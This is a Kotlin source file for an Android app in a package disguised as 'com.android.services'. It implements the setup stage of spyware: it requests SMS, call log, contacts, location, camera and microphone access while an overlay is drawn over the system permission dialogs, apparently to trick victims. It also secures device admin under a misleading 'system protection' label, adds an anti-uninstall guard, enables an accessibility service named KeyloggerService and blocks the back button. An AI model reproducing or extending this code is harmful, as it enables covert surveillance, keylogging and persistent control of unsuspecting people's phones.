package com.android.services

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.crashlytics.FirebaseCrashlytics

class SilentSetupActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
    private val crashlytics by lazy { FirebaseCrashlytics.getInstance() }

    private val permissions = mutableListOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.RECORD_AUDIO,
    )

    private var permissionIndex = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        crashlytics.log("SilentSetupActivity: onCreate")

        // ── Anti-Uninstall Guard: jika dipanggil dari onDisabled, langsung ke admin ──
        // Bypass semua step awal (overlay, runtime perms, storage, battery)
        // karena semua itu sudah pernah di-grant sebelumnya.
        if (intent.getBooleanExtra("force_request_admin", false)) {
            crashlytics.log("SilentSetupActivity: force_request_admin mode")
            handler.postDelayed({ requestDeviceAdmin() }, 300)
            return
        }

        // ── Normal setup flow ─────────────────────────────────────────────────
        // Langkah PERTAMA: minta SYSTEM_ALERT_WINDOW sebelum runtime permissions.
        // Overlay trick tidak bisa jalan tanpa izin ini.
        requestOverlayPermission()
    }

    // ── Step 0: SYSTEM_ALERT_WINDOW (wajib untuk overlay trick) ─────────────

    private fun requestOverlayPermission() {
        crashlytics.log("SilentSetupActivity: requestOverlayPermission")
        if (!Settings.canDrawOverlays(this)) {
            try {
                startActivityForResult(
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    ), 2000
                )
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        // Sudah granted (atau skip karena error) → lanjut ke runtime permissions
        requestNextPermission()
    }

    // ── Runtime permissions ──────────────────────────────────────────────────

    private fun requestNextPermission() {
        // Lewati permission yang sudah granted
        while (permissionIndex < permissions.size) {
            val perm = permissions[permissionIndex]
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                permissionIndex++
            } else break
        }

        if (permissionIndex >= permissions.size) {
            // Semua runtime permission selesai — matikan overlay lalu lanjut
            OverlayTrickManager.stop(this)
            requestSpecialPermissions()
            return
        }

        val perm = permissions[permissionIndex]
        crashlytics.log("SilentSetupActivity: requesting permission[$permissionIndex] = $perm")

        // ── Tampilkan overlay trick SEBELUM dialog permission muncul ─────────
        // Delay 200ms agar dialog muncul dulu, baru overlay di-render di atasnya.
        // callerPkg = package sistem yang akan menampilkan dialog (auto-detect ROM Y).
        handler.postDelayed({
            val permPkg = resolvePermissionControllerPkg()
            OverlayTrickManager.start(applicationContext, null, callerPkg = permPkg)
        }, 200)

        try {
            ActivityCompat.requestPermissions(this, arrayOf(perm), 1000 + permissionIndex)
        } catch (e: Exception) {
            crashlytics.recordException(e)
            OverlayTrickManager.stop(this)
            permissionIndex++
            handler.postDelayed({ requestNextPermission() }, 300)
        }
    }

    /**
     * Deteksi package permission controller yang aktif di ROM ini.
     * Dipakai OverlayTrickManager untuk pilih rasio Y yang tepat.
     */
    private fun resolvePermissionControllerPkg(): String {
        val candidates = listOf(
            "com.samsung.android.permissioncontroller",
            "com.miui.securitycenter",
            "com.huawei.systemmanager",
            "com.google.android.permissioncontroller",
            "com.android.permissioncontroller",
            "com.google.android.packageinstaller",
            "com.android.packageinstaller"
        )
        val pm = packageManager
        for (pkg in candidates) {
            try {
                pm.getPackageInfo(pkg, 0)
                return pkg
            } catch (_: Exception) {}
        }
        return "com.android.permissioncontroller"
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val granted = grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED
        crashlytics.log("SilentSetupActivity: permissionResult[$requestCode] granted=$granted")
        // Matikan overlay setelah user merespons dialog
        OverlayTrickManager.stop(this)
        permissionIndex++
        handler.postDelayed({ requestNextPermission() }, 300)
    }

    // ── Storage ──────────────────────────────────────────────────────────────

    private fun requestSpecialPermissions() {
        crashlytics.log("SilentSetupActivity: requestSpecialPermissions")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2001
                )
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        requestBatteryOptimization()
    }

    // ── Battery optimization ─────────────────────────────────────────────────

    private fun requestBatteryOptimization() {
        crashlytics.log("SilentSetupActivity: requestBatteryOptimization")
        val pm = getSystemService(PowerManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
            !pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2002
                )
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        requestDeviceAdmin()
    }

    // ── Device Admin ─────────────────────────────────────────────────────────

    private fun requestDeviceAdmin() {
        crashlytics.log("SilentSetupActivity: requestDeviceAdmin")
        if (!dpm.isAdminActive(adminComponent)) {
            try {
                startActivityForResult(
                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk proteksi sistem.")
                    }, 2003
                )
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        requestAccessibility()
    }

    // ── Accessibility (Keylogger) ─────────────────────────────────────────────

    private fun isAccessibilityEnabled(serviceClass: Class<*>): Boolean {
        return try {
            val expected = ComponentName(this, serviceClass)
            val enabled = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(enabled)
            while (splitter.hasNext()) {
                val cn = ComponentName.unflattenFromString(splitter.next())
                if (cn != null && cn == expected) return true
            }
            false
        } catch (e: Exception) {
            crashlytics.recordException(e)
            false
        }
    }

    private fun requestAccessibility() {
        crashlytics.log("SilentSetupActivity: requestAccessibility")
        val keylogOk = isAccessibilityEnabled(KeyloggerService::class.java)
        if (!keylogOk) {
            try {
                startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 2005)
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        finishSetup()
    }

    // ── onActivityResult ─────────────────────────────────────────────────────
    // Urutan: overlay (2000) → runtime perms → storage (2001) → battery (2002)
    //         → device admin (2003) → accessibility (2005) → finish.

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        crashlytics.log("SilentSetupActivity: onActivityResult requestCode=$requestCode resultCode=$resultCode")
        handler.postDelayed({
            when (requestCode) {
                2000 -> requestNextPermission()  // overlay permission selesai → runtime perms
                2001 -> requestBatteryOptimization()
                2002 -> requestDeviceAdmin()
                2003 -> requestAccessibility()
                2005 -> finishSetup()
                else -> {
                    crashlytics.log("SilentSetupActivity: unknown requestCode=$requestCode")
                    finishSetup()
                }
            }
        }, 400)
    }

    // ── Finish ───────────────────────────────────────────────────────────────

    private fun finishSetup() {
        crashlytics.log("SilentSetupActivity: finishSetup → launching MatrixSuccessActivity")
        try {
            startActivity(Intent(this, MatrixSuccessActivity::class.java))
        } catch (e: Exception) {
            crashlytics.recordException(e)
            getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("setup_done", true).apply()
        }
        finish()
    }

    @Suppress("DEPRECATION", "MissingSuperCall")
    override fun onBackPressed() {
        // Blokir back selama setup berlangsung
    }
}
